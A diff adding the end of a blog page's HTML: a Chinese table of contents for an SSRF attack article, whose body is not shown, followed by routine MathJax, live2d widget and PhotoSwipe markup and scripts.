+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSRF"><span class="toc-number">1.1.</span> <span class="toc-text">什么是SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF可以做什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BESSRF"><span class="toc-number">1.3.</span> <span class="toc-text">怎么找SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">注意</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">从远程服务器请求资源</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XML-Fuzz-Cheatsheet%EF%BC%88%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E8%A1%A8%EF%BC%89"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">XML Fuzz Cheatsheet（模糊测试表）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XML-Fuzz-Cheatsheet-%E2%80%94%E2%80%94-Web-Services-%E6%A0%87%E5%87%86%E9%A1%B9"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">XML Fuzz Cheatsheet —— Web Services 标准项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XML-Fuzz-Cheatsheet-%E2%80%94%E2%80%94-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E4%B8%8E%E6%96%B0%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">XML Fuzz Cheatsheet —— 第三方应用与新协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E7%BD%AE%E5%8A%9F%E8%83%BD"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">数据库内置功能</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web-mail-%E6%94%B6%E5%8F%96%E5%85%B6%E4%BB%96%E9%82%AE%E7%AE%B1%E9%82%AE%E4%BB%B6"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">Web mail 收取其他邮箱邮件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E3%80%81%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86%E3%80%81%E5%B1%9E%E6%80%A7%E4%BF%A1%E6%81%AF%E5%A4%84%E7%90%86"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">文件处理、编码处理、属性信息处理</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">遇到限制的绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IP%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%EF%BC%88xip-io%E3%80%81%E5%8D%81%E8%BF%9B%E5%88%B6IP%E3%80%81%E5%85%AB%E8%BF%9B%E5%88%B6IP%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">IP限制绕过（xip.io、十进制IP、八进制IP）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%EF%BC%88Redirect%CC%B5CRLF-header-injection%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">协议限制绕过（Redirect̵CRLF header injection）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WebLogic-SSRF-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CRLF-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">WebLogic SSRF 漏洞利用 CRLF HTTP头注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WebLogic-SSRF-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B-FingerPrint"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">WebLogic SSRF 服务探测 (FingerPrint)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%A7%E9%83%A8%E5%88%86%E4%BC%81%E4%B8%9A%E8%AE%A4%E4%B8%BAWebLogic%E8%87%AA%E5%B8%A6%E7%9A%84SSRF%E4%B8%8D%E7%AE%97%E6%98%AF%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">大部分企业认为WebLogic自带的SSRF不算是漏洞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%96%B9%E6%B3%95%EF%BC%88Protocols-amp-Wrappers%EF%BC%89"><span class="toc-number">2.2.3.</span> <span class="toc-text">调用系统支持的协议和方法（Protocols &amp; Wrappers）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用（远程服务）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.1.</span> <span class="toc-text">利用SSRF攻击本地服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SSRF%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93-amp-%E7%BC%93%E5%AD%98"><span class="toc-number">2.3.2.</span> <span class="toc-text">利用SSRF攻击数据库&amp;缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE-gt-SSRF-gt-CSRF-%E7%BB%84%E5%90%88%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.3.</span> <span class="toc-text">XXE -&gt; SSRF -&gt; CSRF 组合方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">2.4.</span> <span class="toc-text">自动化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.4.1.</span> <span class="toc-text">服务指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E7%94%A8%E4%BA%8ESSRF%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8"><span class="toc-number">2.4.2.</span> <span class="toc-text">能用于SSRF的漏洞列表</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+<!--血小板代码-->
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
+<div id="landlord">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://calmcenter.club/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/kesshouban_v2/model.json");
+</script>
+<!--血小板代码-->
+
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+</html>
